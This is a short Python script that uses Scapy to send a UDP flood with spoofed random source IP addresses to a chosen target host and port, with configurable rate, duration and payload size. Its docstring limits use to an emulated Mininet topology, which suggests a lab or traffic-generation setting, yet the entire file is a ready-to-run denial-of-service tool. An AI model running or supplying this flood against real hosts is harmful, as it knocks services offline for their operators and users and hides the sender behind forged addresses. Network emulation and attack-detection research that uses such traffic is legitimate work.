"""UDP flood via Scapy — spoofed source IPs, random payload. Requires root.
Only point this at hosts inside the emulated Mininet topology.
"""
import argparse
import time

from scapy.all import IP, UDP, RandIP, RandShort, send


def run(target, target_port=53, rate=500, duration=10, payload_size=64,
        spoof_subnet="10.0.0.0/8", verbose=True):
    interval = 1.0 / rate
    end = time.time() + duration
    payload = b"\x00" * payload_size
    sent = 0
    while time.time() < end:
        pkt = (IP(src=RandIP(spoof_subnet), dst=target) /
               UDP(sport=RandShort(), dport=target_port) / payload)
        send(pkt, verbose=0)
        sent += 1
        time.sleep(interval)
    if verbose:
        print(f"udp_flood: sent {sent} packets to {target}:{target_port}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--target-port", type=int, default=53)
    parser.add_argument("--rate", type=float, default=500)
    parser.add_argument("--duration", type=float, default=10)
    parser.add_argument("--payload-size", type=int, default=64)
    args = parser.parse_args()
    run(args.target, args.target_port, args.rate, args.duration, args.payload_size)


if __name__ == "__main__":
    main()
